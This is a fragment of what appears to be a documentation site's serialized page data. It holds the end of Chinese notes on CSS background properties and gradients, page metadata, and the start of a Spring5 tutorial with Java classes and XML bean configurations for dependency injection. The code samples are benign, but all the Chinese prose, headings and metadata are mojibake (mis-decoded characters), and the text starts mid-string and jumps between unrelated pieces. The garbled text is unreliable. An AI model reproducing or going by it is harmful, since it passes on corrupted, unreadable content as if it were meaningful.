ï¼å°ä¼ä¸ä¸ªé¨åèæ¯æ æ³å®å¨æ¾ç¤º\n * å¦æèæ¯å¾çååç´ ä¸æ ·å¤§ï¼åä¼ç´æ¥æ­£å¸¸æ¾ç¤º\n\nbackground-repeat ç¨æ¥è®¾ç½®èæ¯çéå¤æ¹å¼\n\n * repeat é»è®¤å¼ ï¼ èæ¯ä¼æ²¿çxè½´ yè½´åæ¹åéå¤\n\n * repeat-x æ²¿çxè½´æ¹åéå¤\n\n * repeat-y æ²¿çyè½´æ¹åéå¤\n\n * no-repeat èæ¯å¾çä¸éå¤\n\nbackground-position ç¨æ¥è®¾ç½®èæ¯å¾ççä½ç½®ï¼éè¿ top left right bottom center å ä¸ªè¡¨ç¤ºæ¹ä½çè¯æ¥è®¾ç½®èæ¯å¾ççä½ç½®\n\nä½¿ç¨æ¹ä½è¯æ¶å¿é¡»è¦åæ¶æå®ä¸¤ä¸ªå¼ï¼å¦æåªåä¸ä¸ªåç¬¬äºä¸ªé»è®¤å°±æ¯center\n\néè¿åç§»éæ¥æå®èæ¯å¾ççä½ç½®ï¼æ°´å¹³æ¹åçåç§»é åç´æ¹ååé\n\nbackground-position: -50px 300px;\n\nè®¾ç½®èæ¯çèå´ background-clip\n\n * border-box é»è®¤å¼ï¼èæ¯ä¼åºç°å¨è¾¹æ¡çä¸è¾¹\n\n * padding-box èæ¯ä¸ä¼åºç°å¨è¾¹æ¡ï¼åªåºç°å¨åå®¹åºååè¾¹è·\n\n * content-box èæ¯åªä¼åºç°å¨åå®¹åº\n\nbackground-origin èæ¯å¾ççåç§»éè®¡ç®çåç¹\n\n * padding-box é»è®¤å¼ï¼background-positionä»åè¾¹è·å¤å¼å§è®¡ç®\n\n * content-box èæ¯å¾ççåç§»éä»åå®¹åºå¤è®¡ç®\n\n * border-box èæ¯å¾ççåéä»è¾¹æ¡å¤å¼å§è®¡ç®\n\nbackground-size è®¾ç½®èæ¯å¾ççå¤§å°\n\n * ç¬¬ä¸ä¸ªå¼è¡¨ç¤ºå®½åº¦\n\n * ç¬¬äºä¸ªå¼è¡¨ç¤ºé«åº¦\n\nå¦æåªåä¸ä¸ªï¼åç¬¬äºä¸ªå¼é»è®¤æ¯ autoï¼cover å¾ççæ¯ä¾ä¸åï¼å°åç´ éºæ»¡ãcontain å¾çæ¯ä¾ä¸åï¼å°å¾çå¨åç´ ä¸­å®æ´æ¾ç¤ºã\n\nbackground-color\nbackground-image\nbackground-repeat\nbackground-position\nbackground-size\nbackground-origin\nbackground-clip\nbackground-attachment\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nbackgound èæ¯ç¸å³çç®åå±æ§ï¼ææèæ¯ç¸å³çæ ·å¼é½å¯ä»¥éè¿è¯¥æ ·å¼æ¥è®¾ç½®ãå¹¶ä¸è¯¥æ ·å¼æ²¡æé¡ºåºè¦æ±ï¼ä¹æ²¡æåªä¸ªå±æ§æ¯å¿é¡»åçã\n\nbackground-sizeå¿é¡»åå¨background-positionçåè¾¹ï¼å¹¶ä¸ä½¿ç¨/éå¼ï¼background-position/background-sizeã\n\nbackground-origin background-clip ä¸¤ä¸ªæ ·å¼ ï¼orginè¦å¨clipçåè¾¹ã\n\nbackground-attachmentï¼èæ¯å¾çæ¯å¦è·éåç´ ç§»å¨\n\n * scroll é»è®¤å¼ èæ¯å¾çä¼è·éåç´ ç§»å¨\n\n * fixed èæ¯ä¼åºå®å¨é¡µé¢ä¸­ï¼ä¸ä¼éåç´ ç§»å¨\n\n# æ¸å\n\néè¿æ¸åå¯ä»¥è®¾ç½®ä¸äºå¤æçèæ¯é¢è²ï¼å¯ä»¥å®ç°ä»ä¸ä¸ªé¢è²åå¶ä»é¢è²è¿æ¸¡çææï¼æ¸åæ¯å¾çï¼éè¦éè¿background-imageæ¥è®¾ç½®\n\nçº¿æ§æ¸åï¼é¢è²æ²¿çä¸æ¡ç´çº¿åçååï¼linear-gradient()\n\nlinear-gradient(red,yellow) çº¢è²å¨å¼å¤´ï¼é»è²å¨ç»å°¾ï¼ä¸­é´æ¯è¿æ¸¡åºå\n\nçº¿æ§æ¸åçå¼å¤´ï¼æä»¬å¯ä»¥æå®ä¸ä¸ªæ¸åçæ¹å\n\n * to left\n\n * to right\n\n * to bottom\n\n * to top\n\n * deg degè¡¨ç¤ºåº¦æ°\n\n * turn è¡¨ç¤ºå\n\næ¸åå¯ä»¥åæ¶æå®å¤ä¸ªé¢è²ï¼å¤ä¸ªé¢è²é»è®¤æåµä¸å¹³ååå¸ï¼ä¹å¯ä»¥æå¨æå®æ¸åçåå¸æåµ\n\nrepeating-linear-gradient() å¯ä»¥å¹³éºççº¿æ§æ¸å\n\nradial-gradient() å¾åæ¸å(æ¾å°æ§çææ)\n\né»è®¤æåµä¸å¾åæ¸åçå½¢ç¶æ ¹æ®åç´ çå½¢ç¶æ¥è®¡ç®çãæ­£æ¹å½¢ --\x3e åå½¢ï¼é¿æ¹å½¢ --\x3e æ¤­åå½¢\n\næä»¬ä¹å¯ä»¥æå¨æå®å¾åæ¸åçå¤§å°\n\n * circle\n\n * ellipse\n\nä¹å¯ä»¥æå®æ¸åçä½ç½®\n\nradial-gradient(å¤§å° at ä½ç½®, é¢è² ä½ç½® ,é¢è² ä½ç½® ,é¢è² ä½ç½®)\n\nå¤§å°\n\n * circle åå½¢\n\n * ellipse æ¤­å\n\n * closest-side è¿è¾¹\n\n * closest-corner è¿è§\n\n * farthest-side è¿è¾¹\n\n * farthest-corner è¿è§\n\nä½ç½®ï¼\n\ntop right left center bottom\n\n\n# å¨ç»\n\n\n# ååºå¼å¸å±\n\n\n# ç»ä¹ ',charsets:{cjk:!0},lastUpdated:"2022/06/23, 01:35:59",lastUpdatedTimestamp:1655948159e3},{title:"Spring5",frontmatter:{title:"Spring5",date:"2022-01-01T00:00:00.000Z",permalink:"/dev/java/core/spring5",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡æ ¸å¿"],tags:["SSM","Spring5"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1011.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A0%B8%E5%BF%83/00.Spring5.html",relativePath:"01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/00.Spring5.md",key:"v-1068c768",path:"/dev/java/core/spring5/",headers:[{level:2,title:"Springç®ä»",slug:"springç®ä»",normalizedTitle:"springç®ä»",charIndex:14},{level:3,title:"æ¦è¿°",slug:"æ¦è¿°",normalizedTitle:"æ¦è¿°",charIndex:27},{level:3,title:"SpringDemo",slug:"springdemo",normalizedTitle:"springdemo",charIndex:286},{level:2,title:"SpringIOC",slug:"springioc",normalizedTitle:"springioc",charIndex:45},{level:3,title:"èæ¯",slug:"èæ¯",normalizedTitle:"èæ¯",charIndex:1232},{level:3,title:"IOCåºå±åç",slug:"iocåºå±åç",normalizedTitle:"iocåºå±åç",charIndex:1397},{level:3,title:"Beanç®¡ç",slug:"beanç®¡ç",normalizedTitle:"beanç®¡ç",charIndex:1734},{level:2,title:"SpringAOP",slug:"springaop",normalizedTitle:"springaop",charIndex:62},{level:3,title:"AOPæ¦å¿µ",slug:"aopæ¦å¿µ",normalizedTitle:"aopæ¦å¿µ",charIndex:15908},{level:3,title:"AOPåºå±åç",slug:"aopåºå±åç",normalizedTitle:"aopåºå±åç",charIndex:16029},{level:3,title:"AOPç¸å³æ¦å¿µ",slug:"aopç¸å³æ¦å¿µ",normalizedTitle:"aopç¸å³æ¦å¿µ",charIndex:17707},{level:3,title:"AOPç¯å¢åå¤",slug:"aopç¯å¢åå¤",normalizedTitle:"aopç¯å¢åå¤",charIndex:17851},{level:3,title:"åºäºæ³¨è§£æ¹å¼çéç½®",slug:"åºäºæ³¨è§£æ¹å¼çéç½®",normalizedTitle:"åºäºæ³¨è§£æ¹å¼çéç½®",charIndex:18412},{level:3,title:"åºäºXMLæ¹å¼éç½®",slug:"åºäºxmlæ¹å¼éç½®",normalizedTitle:"åºäºxmlæ¹å¼éç½®",charIndex:21047},{level:2,title:"JdbcTemplate",slug:"jdbctemplate",normalizedTitle:"jdbctemplate",charIndex:22631},{level:3,title:"æ¦è¿°",slug:"æ¦è¿°-2",normalizedTitle:"æ¦è¿°",charIndex:27},{level:3,title:"åå¤å·¥ä½",slug:"åå¤å·¥ä½",normalizedTitle:"åå¤å·¥ä½",charIndex:22705},{level:3,title:"CRUD",slug:"crud",normalizedTitle:"crud",charIndex:25636},{level:2,title:"äºå¡",slug:"äºå¡",normalizedTitle:"äºå¡",charIndex:29506},{level:3,title:"æ¦å¿µ",slug:"æ¦å¿µ",normalizedTitle:"æ¦å¿µ",charIndex:208},{level:3,title:"æµè¯ä»£ç ",slug:"æµè¯ä»£ç ",normalizedTitle:"æµè¯ä»£ç ",charIndex:957},{level:3,title:"äºå¡çæä½è¿ç¨",slug:"äºå¡çæä½è¿ç¨",normalizedTitle:"äºå¡çæä½è¿ç¨",charIndex:30959},{level:3,title:"åºäºæ³¨è§£æ¹å¼çäºå¡ç®¡ç",slug:"åºäºæ³¨è§£æ¹å¼çäºå¡ç®¡ç",normalizedTitle:"åºäºæ³¨è§£æ¹å¼çäºå¡ç®¡ç",charIndex:31201},{level:3,title:"åºäºXMLéç½®äºå¡",slug:"åºäºxmléç½®äºå¡",normalizedTitle:"åºäºxmléç½®äºå¡",charIndex:34184},{level:2,title:"Spring5æ°ç¹æ§",slug:"spring5æ°ç¹æ§",normalizedTitle:"spring5æ°ç¹æ§",charIndex:36151},{level:3,title:"æ¦è¿°",slug:"æ¦è¿°-3",normalizedTitle:"æ¦è¿°",charIndex:27},{level:3,title:"æ´åæ¥å¿æ¡æ¶",slug:"æ´åæ¥å¿æ¡æ¶",normalizedTitle:"æ´åæ¥å¿æ¡æ¶",charIndex:36233},{level:3,title:"Nullableæ³¨è§£",slug:"nullableæ³¨è§£",normalizedTitle:"nullableæ³¨è§£",charIndex:36777},{level:3,title:"æ ¸å¿å®¹å¨æ¯æå½æ°å¼é£æ ¼",slug:"æ ¸å¿å®¹å¨æ¯æå½æ°å¼é£æ ¼",normalizedTitle:"æ ¸å¿å®¹å¨æ¯æå½æ°å¼é£æ ¼",charIndex:36856},{level:3,title:"æ¯ææ´åJunit5",slug:"æ¯ææ´åjunit5",normalizedTitle:"æ¯ææ´åjunit5",charIndex:37412},{level:3,title:"SpringWebflux",slug:"springwebflux",normalizedTitle:"springwebflux",charIndex:39044},{level:2,title:"Springæ´åMyBatis",slug:"springæ´åmybatis",normalizedTitle:"springæ´åmybatis",charIndex:39105}],headersStr:"Springç®ä» æ¦è¿° SpringDemo SpringIOC èæ¯ IOCåºå±åç Beanç®¡ç SpringAOP AOPæ¦å¿µ AOPåºå±åç AOPç¸å³æ¦å¿µ AOPç¯å¢åå¤ åºäºæ³¨è§£æ¹å¼çéç½® åºäºXMLæ¹å¼éç½® JdbcTemplate æ¦è¿° åå¤å·¥ä½ CRUD äºå¡ æ¦å¿µ æµè¯ä»£ç  äºå¡çæä½è¿ç¨ åºäºæ³¨è§£æ¹å¼çäºå¡ç®¡ç åºäºXMLéç½®äºå¡ Spring5æ°ç¹æ§ æ¦è¿° æ´åæ¥å¿æ¡æ¶ Nullableæ³¨è§£ æ ¸å¿å®¹å¨æ¯æå½æ°å¼é£æ ¼ æ¯ææ´åJunit5 SpringWebflux Springæ´åMyBatis",content:'# Spring5\n\n\n# Springç®ä»\n\n\n# æ¦è¿°\n\nSpringæ¯ä¸ä¸ªæ§å¶åè½¬(SpringIOC)åé¢ååé¢ç(SpringAOP)çè½»éçº§æ¡æ¶ãSpringæ¯ä¸ä¸ªæ¡æ¶é,åé¨éæäºå¾å¤çåè½,å¯ä»¥æ ¹æ®éæ±éæ©å¯¹åºçå­æ¡æ¶ä½¿ç¨ã\n\nä½ç¨ï¼\n\n * ç®åä¼ä¸é¡¹ç®çå¼åçæµç¨ï¼æåå¼åæç\n * ä¾¿äºä»£ç çåæç»´æ¤åçº§\n * å°ä»£ç ä¹é´çè¦åæ§éä½\n\nSpring Framework ç»æé¨å\n\n\n\næ ¸å¿æ¦å¿µï¼\n\n * SpringIOCï¼æ§å¶åè½¬ï¼æåå»ºå¯¹è±¡è¿ç¨äº¤ç»Springè¿è¡ç®¡ç\n * SpringAOPï¼é¢ååé¢ï¼ä¸ä¿®æ¹æºä»£ç è¿è¡åè½å¢å¼º\n\n\n# SpringDemo\n\n> Springç»ä»¶ä¸è½½å°åï¼JFrog (spring.io)\n\n 1. åå»ºé¡¹ç®ï¼å¯¼å¥åºç¡Jarå\n    \n    \n\n 2. åå»ºæµè¯ç±»\n\n\tpackage com.pwddd.spring5; \n\tpublic class User { \n\t\tpublic void add(){ \n\t\t\tSystem.out.println("add......."); \n\t\t} \n\t}\n\n\n1\n2\n3\n4\n5\n6\n\n 3. åå»ºéç½®æä»¶\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:p="http://www.springframework.org/schema/p"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">\n\n    <bean id="user" class="com.pwddd.spring5.User" />\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 4. ç¼åæµè¯ä»£ç \n\n@Test\npublic void testAdd(){\n    ApplicationContext applicationContext = new ClassPathXmlApplicationContext("bean1.xml");\n    User user = applicationContext.getBean("user", User.class);\n    System.out.println(user);\n    user.add();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# SpringIOC\n\n\n# èæ¯\n\nå¨ä½¿ç¨MVCçç»æä½ç³»æ¥å®æåå°åè½ä»£ç çå£°ææ¶ï¼å¨ä¸å®ç¨åº¦ä¸éä½äºä»£ç çåä½ï¼ä½æ¯å±ä¸å±ä¹é´çè¦åæ§è¿é«ï¼é æä»£ç åçº§ç»´æ¤ç¹å«éº»ç¦ãæ¯å¦ï¼æå¤©ä¸å¡å±æä¸ªç±»æä»¶éè¦æ¿æ¢ä¸ºæ°çç±»æä»¶ï¼é£ä¹ï¼æ§å¶å±ææè°ç¨è¯¥ä¸å¡ç±»çä»£ç éè¦å¨é¨ä¿®æ¹ä¸ºè°ç¨æ°çä¸å¡ç±»ã è§£å³åæ³å°±æ¯å°å±ä¸å±å¯¹è±¡ä¹é´çå³ç³»è§£è¦ï¼ç±ç´æ¥å³ç³»åä¸ºé´æ¥å³ç³»ã\n\n\n# IOCåºå±åç\n\n# ä»ä¹æ¯IOC\n\næ§å¶åè½¬ï¼æå¯¹è±¡åå»ºåå¯¹è±¡ä¹é´çè°ç¨è¿ç¨ï¼äº¤ç»Springè¿è¡ç®¡ç ä½¿ç¨IOCç®çï¼ä¸ºäºè¦ååº¦éä½\n\n# åçè®²è§£\n\n\n\n# BeanFactoryæ¥å£\n\nIOCææ³åºäºIOCå®¹å¨å®æï¼IOCå®¹å¨åºå±å°±æ¯å¯¹è±¡å·¥åãSpringæä¾IOCå®¹å¨å®ç°ä¸¤ç§æ¹å¼ï¼ï¼ä¸¤ä¸ªæ¥å£ï¼\n\n * BeanFactoryï¼IOCå®¹å¨åºæ¬å®ç°ï¼æ¯Springåé¨çä½¿ç¨æ¥å£ï¼ä¸æä¾å¼åäººåè¿è¡ä½¿ç¨\n   * å è½½éç½®æä»¶æ¶åä¸ä¼åå»ºå¯¹è±¡ï¼å¨è·åå¯¹è±¡ï¼ä½¿ç¨ï¼æå»åå»ºå¯¹è±¡\n * ApplicationContextï¼BeanFactoryæ¥å£çå­æ¥å£ï¼æä¾æ´å¤æ´å¼ºå¤§çåè½ï¼ä¸è¬ç±å¼åäººåè¿è¡ä½¿ç¨\n   * å è½½éç½®æä»¶æ¶åå°±ä¼æå¨éç½®æä»¶å¯¹è±¡è¿è¡åå»º\n\n\n# Beanç®¡ç\n\nBeanç®¡çåå«ä¸¤ä¸ªæ¹é¢ï¼\n\n * Springåå»ºå¯¹è±¡\n * Springæ³¨å¥å±æ§\n\nBeanç®¡ççä¸¤ç§æ¹å¼ï¼\n\n * åºäºXMLè¿è¡éç½®\n * åºäºæ³¨è§£çæ¹å¼å®ç°\n\n# åºäºXMLè¿è¡éç½®\n\n# åå»ºå¯¹è±¡\n\nå¨springéç½®æä»¶ä¸­ï¼ä½¿ç¨beanæ ç­¾ï¼æ ç­¾éé¢æ·»å å¯¹åºå±æ§ï¼å°±å¯ä»¥å®ç°å¯¹è±¡åå»ºãåå»ºå¯¹è±¡æ¶ï¼é»è®¤æ§è¡æ åæ°æé æ¹æ³å®æå¯¹è±¡çåå»ºãå¨beanæ ç­¾æå¾å¤å±æ§ï¼å¸¸ç¨çå±æ§æä¸¤ä¸ªï¼\n\n * idå±æ§ï¼å¯ä¸æ è¯\n * classå±æ§ï¼ç±»å¨è·¯å¾ï¼åç±»è·¯å¾ï¼\n\nuser Beanéç½®ï¼\n\n<bean id="user" class="com.pwddd.spring5.User" />\n\n\n1\n\n\n# æ³¨å¥å±æ§\n\næ³¨å¥å±æ§æä¸¤ç§æ¹å¼ï¼\n\n * ä½¿ç¨setæ¹æ³è¿è¡æ³¨å¥\n * ä½¿ç¨æé å¨è¿è¡æ³¨å¥\n * påç§°ç©ºé´æ³¨å¥ï¼å®éä¸æ¯setæ¹æ³æ³¨å¥ï¼\n\n# ä½¿ç¨setè¿è¡æ³¨å¥\n\n 1. åå»ºç±»ï¼ç¼åå¯¹åºå±æ§çsetæ¹æ³ã\n\npackage com.pwddd.spring5;\n\npublic class Book {\n    public String name;\n    public String author;\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public void setAuthor(String author) {\n        this.author = author;\n    }\n\n    @Override\n    public String toString() {\n        return "Book{" +\n                "name=\'" + name + \'\\\'\' +\n                ", author=\'" + author + \'\\\'\' +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n 2. ç¼åXMLéç½®æä»¶ï¼ä½¿ç¨propertyè¿è¡æ³¨å¥\n\n<bean id="book" class="com.pwddd.spring5.Book" >\n    <property name="name" value="çº¢æ¥¼"></property>\n    <property name="author" value="æ¹éªè¹"></property>\n</bean>\n\n\n1\n2\n3\n4\n\n\n# ä½¿ç¨å¸¦åæé è¿è¡æ³¨å¥\n\n 1. åå»ºç±»ï¼å¹¶çæå¸¦åæé å¨ã\n\npackage com.pwddd.spring5;\n\npublic class Order {\n    public String id;\n    public String phone;\n\n    @Override\n    public String toString() {\n        return "Order{" +\n                "id=\'" + id + \'\\\'\' +\n                ", phone=\'" + phone + \'\\\'\' +\n                \'}\';\n    }\n\n    public Order(String id, String phone) {\n        this.id = id;\n        this.phone = phone;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n 2. ç¼åéç½®XMLéç½®æä»¶ï¼ä½¿ç¨constructor-argè¿è¡æ³¨å¥ã\n\n<bean id="order" class="com.pwddd.spring5.Order" >\n    <constructor-arg index="0" value="00001"></constructor-arg>\n    <constructor-arg index="1" value="ä¸æµ·"></constructor-arg>\n</bean>\n\n\n1\n2\n3\n4\n\n\n# Påç§°ç©ºé´æ³¨å¥\n\n 1. æ·»å påç§°ç©ºé´xmlns\n\nxmlns:p="http://www.springframework.org/schema/p"\n\n\n1\n\n 2. ç¼åXMLéç½®æä»¶\n\n\x3c!--    pæ³¨å¥éè¦æ·»å xmlnsï¼p\n        pæ³¨å¥éè¦setæ¹æ³\n--\x3e\n<bean id="book" class="com.pwddd.spring5.Book" p:name="è¥¿æ¸¸è®°" p:author="hahah" />\n\n\n1\n2\n3\n4\n\n\n# ä¸åç±»åçå±æ§æ³¨å¥æ¹å¼\n\n# å­é¢éNULL\n\n<bean id="order" class="com.pwddd.spring5.Order" >\n  <constructor-arg index="0">\n      <null></null>\n  </constructor-arg>\n  <constructor-arg index="1">\n      <null></null>\n  </constructor-arg>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# åå«ç¹æ®å­ç¬¦çå±æ§å¼\n\n<constructor-arg index="1">\n    <value><![CDATA[<>hahah<>]]>&gt; &lt; </value>\n</constructor-arg>\n\n\n1\n2\n3\n\n\n# å¤é¨bean\n\nUserServiceä¸­éè¦ä¾èµUserDaoï¼å¯ä»¥ä½¿ç¨å¤é¨Beançæ¹å¼å°UserDaoæ³¨å¥å°UserServiceä¸­ã\n\n 1. åå»ºUserService\n\npackage com.pwddd.spring5.service.impl;\n\nimport com.pwddd.spring5.dao.UserDao;\nimport com.pwddd.spring5.service.UserService;\n\npublic class UserServiceImpl implements UserService {\n    private UserDao userDao;\n\n    public void setUserDao(UserDao userDao) {\n        this.userDao = userDao;\n    }\n\n    @Override\n    public void addUser() {\n        System.out.println("service...addUser");\n        userDao.addUser();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. åå»ºUserDao\n\npackage com.pwddd.spring5.dao.impl;\n\nimport com.pwddd.spring5.dao.UserDao;\n\npublic class UserDaoImpl implements UserDao {\n    @Override\n    public void addUser() {\n        System.out.println("dao......addUser");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n 3. ç¼åéç½®æä»¶ï¼ä½¿ç¨refæ³¨å¥å¤é¨Bean\n\n<bean id="userService" class="com.pwddd.spring5.service.impl.UserServiceImpl">\n    <property name="userDao" ref="userDaoImpl"></property>\n</bean>\n\n<bean id="userDaoImpl" class="com.pwddd.spring5.dao.impl.UserDaoImpl"></bean>\n\n\n1\n2\n3\n4\n5\n\n 4. ç¼åæµè¯ä»£ç \n\n@Test\npublic void testUser(){\n\tUserService userService = context.getBean("userService", UserService.class);\n\tuserService.addUser();\n}\n\n\n1\n2\n3\n4\n5\n\n\n# åé¨Bean\n\nå¦æéè¦å¨å®ä½ç±»ä¸­è¡¨ç¤ºç±»åç±»ä¹é´çå¯¹åºå³ç³»ï¼å¯ä»¥ä½¿ç¨åé¨Beanæ¹å¼è¿è¡è¡¨ç¤ºã\n\n 1. ç¼åæµè¯Deptç±»\n\npackage com.pwddd.spring5;\n\npublic class Dept {\n    private String dname;\n    public void setDname(String dname) {\n        this.dname = dname;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. ç¼åæµè¯Empç±»\n\npackage com.pwddd.spring5;\n\npublic class Emp {\n    private String ename;\n    private String gender;\n    //åå·¥å±äºæä¸ä¸ªé¨é¨ï¼ä½¿ç¨å¯¹è±¡å½¢å¼è¡¨ç¤º\n    private Dept dept;\n    public void setDept(Dept dept) {\n        this.dept = dept;\n    }\n    public void setEname(String ename) {\n        this.ename = ename;\n    }\n    public void setGender(String gender) {\n        this.gender = gender;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n 3. ç¬¬ä¸ç§æ¹å¼éç½®æä»¶\n\n<bean id="emp" class="com.pwddd.spring5.Emp">\n  <property name="ename"  value="lalal"></property>\n  <property name="gender" value="male"></property>\n  <property name="dept">\n      <bean id="dept" class="com.pwddd.spring5.Dept">\n          <property name="dname" value="å®ä¿"></property> \n      </bean>\n  </property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. ç¬¬äºç§æ¹å¼éè¦å¨Empä¸­çæDeptçgetæ¹æ³\n\npublic Dept getDept() { return dept; }\n\n\n1\n\n 5. ç¬¬äºç§æ¹å¼éç½®æä»¶\n\n<bean id="emp" class="com.pwddd.spring5.Emp">\n    <property name="gender" value="male"></property>\n    <property name="ename"  value="lalal"></property>\n    <property name="dept" ref="dept"></property>\n    <property name="dept.dname" value="ä¿å®"></property>\n</bean>\n<bean id="dept" class="com.pwddd.spring5.Dept">\n    <property name="dname"  value="è´¢å¡"></property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# éåç±»å\n\néåç±»åæ¯æArrayãListãMapãsetç­ç±»åã\n\n 1. ç¼åæµè¯ç±»ï¼ç±»ä¸­åå«éåç±»åçä¾èµå³ç³»\n\npackage com.pwddd.spring5;\n\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class Stu {\n    public String[] courses;\n\n    public List<String> lists;\n\n    public Map<String, String> maps;\n\n    public Set<String> sets;\n\n    public void setCourses(String[] courses) {\n        this.courses = courses;\n    }\n\n    public void setLists(List<String> lists) {\n        this.lists = lists;\n    }\n\n    public void setMaps(Map<String, String> maps) {\n        this.maps = maps;\n    }\n\n    public void setSets(Set<String> sets) {\n        this.sets = sets;\n    }\n\n    @Override\n    public String toString() {\n        return "Stu{" +\n                "courses=" + Arrays.toString(courses) +\n                ", lists=" + lists +\n                ", maps=" + maps +\n                ", sets=" + sets +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n 2. ç¼åXMLéç½®æä»¶éç½®æ³¨å¥ã\n\n<bean id="stu" class="com.pwddd.spring5.Stu">\n    <property name="courses">\n        <array>\n            <value>è¯­æ</value>\n            <value>æ°å­¦</value>\n        </array>\n    </property>\n\n    <property name="lists">\n        <list>\n            <value>å¼ ä¸</value>\n            <value>æå</value>\n        </list>\n    </property>\n\n    <property name="maps">\n        <map>\n            <entry key="Java" value="1"></entry>\n            <entry key="C" value="2"></entry>\n        </map>\n    </property>\n\n    <property name="sets">\n        <set>\n            <value>aaa</value>\n            <value>bbb</value>\n        </set>\n    </property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n# éååå®¹æå\n\nå¦æå¤ä¸ªä¾èµæ³¨å¥éè¦å¼ç¨ç¸åçéåå¼ï¼é£ä¹å¯ä»¥å°éåå¼æååºæ¥ï¼ç¨çæ¶åç´æ¥å¼ç¨å³å¯ãæåéè¦å¼å¥utilã\n\nå®ä¾XMLéç½®ï¼\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:util="http://www.springframework.org/schema/util"\n       xsi:schemaLocation="\n       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd">\n<util:list id="bookList">\n        <value>haha</value>\n        <value>lala</value>\n    </util:list>\n\n    <bean id="book" class="com.pwddd.spring5.Book">\n        <property name="bookList" ref="bookList"></property>\n    </bean>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# å·¥åBean\n\nSpringæä¸¤ç§ç±»åbeanï¼ä¸ç§æ®ébeanï¼å¦å¤ä¸ç§å·¥åbeanï¼FactoryBeanï¼ä¸åäºBeanFactoryï¼\n\n * æ®ébeanï¼å¨éç½®æä»¶ä¸­å®ä¹beanç±»åå°±æ¯è¿åç±»å\n * å·¥åbeanï¼å¨éç½®æä»¶å®ä¹beanç±»åå¯ä»¥åè¿åç±»åä¸ä¸æ ·\n\nå·¥åBeançä½¿ç¨æ¹å¼ï¼\n\n 1. åå»ºç±»ï¼ä½¿è¿ä¸ªç±»æä¸ºå·¥åï¼å¹¶å®ç°FactoryBeanæ¥å£\n\npackage com.pwddd.spring5;\n\nimport com.pwddd.spring5.Course;\nimport org.springframework.beans.factory.FactoryBean;\n\npublic class MyFactoryBean implements FactoryBean<Course> {\n  @Override\n  public Course getObject() throws Exception {\n\t  Course course = new Course();\n\t  course.setcName("aaa");\n\t  return course;\n  }\n\n  @Override\n  public Class<?> getObjectType() {\n\t  return Course.class;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. å®ç°æ¥å£éé¢çæ¹æ³ï¼å¨å®ç°çæ¹æ³ä¸­å®ä¹è¿åçbeanç±»å\n\n<bean id="factoryBean" class="com.pwddd.spring5.MyFactoryBean"></bean>\n\n\n1\n\n\n# Beançä½ç¨å\n\nå¨Springéé¢ï¼é»è®¤æåµä¸ï¼beanæ¯åå®ä¾å¯¹è±¡ã\n\n\n\nå¯ä»¥éè¿éç½®æä»¶è®¾ç½®Beanæ¯åä¾çè¿æ¯å¤ä¾çæ¨¡å¼ï¼ å¨springéç½®æä»¶beanæ ç­¾éé¢æå±æ§ï¼scopeï¼ç¨äºè®¾ç½®åå®ä¾è¿æ¯å¤å®ä¾ ç¬¬ä¸ä¸ªå¼ é»è®¤å¼ï¼singletonï¼è¡¨ç¤ºæ¯åå®ä¾å¯¹è±¡ ç¬¬äºä¸ªå¼prototypeï¼è¡¨ç¤ºæ¯å¤å®ä¾å¯¹è±¡\n\n<bean id="course" class="com.pwddd.spring5.Course" scope="prototype"></bean>\n\n\n1\n\n\nsingletonåprototypeåºå«\n\n * singletonåå®ä¾ï¼prototypeå¤å®ä¾\n * è®¾ç½®scopeå¼æ¯singletonæ¶åï¼å è½½springéç½®æä»¶æ¶åå°±ä¼åå»ºåå®ä¾å¯¹è±¡\n * 